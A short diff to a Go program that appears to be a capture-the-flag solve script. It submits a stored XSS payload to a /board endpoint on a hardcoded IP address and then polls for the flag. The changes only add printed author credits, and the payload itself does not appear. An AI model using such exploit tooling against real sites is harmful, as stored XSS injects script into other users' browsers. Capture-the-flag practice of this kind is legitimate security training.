@@ -14,6 +14,7 @@ import (
 const defaultBaseURL = "http://47.120.61.230:33236"
 
 func main() {
+	defer fmt.Println("作者 ZluxYao")
 	baseURL := defaultBaseURL
 	if len(os.Args) > 1 {
 		baseURL = strings.TrimRight(os.Args[1], "/")
@@ -35,6 +36,7 @@ func main() {
 	fmt.Println("[*] Submitting stored XSS payload to /board ...")
 	if err := submitPayload(client, baseURL, author, payload); err != nil {
 		fmt.Fprintf(os.Stderr, "[-] submit failed: %v\n", err)
+		fmt.Println("作者 ZluxYao")
 		os.Exit(1)
 	}
 	fmt.Println("[+] Payload submitted.")
@@ -43,6 +45,7 @@ func main() {
 	flag, err := pollFlag(client, baseURL, 90*time.Second, 5*time.Second)
 	if err != nil {
 		fmt.Fprintf(os.Stderr, "[-] flag not found: %v\n", err)
+		fmt.Println("作者 ZluxYao")
 		os.Exit(1)
 	}
 
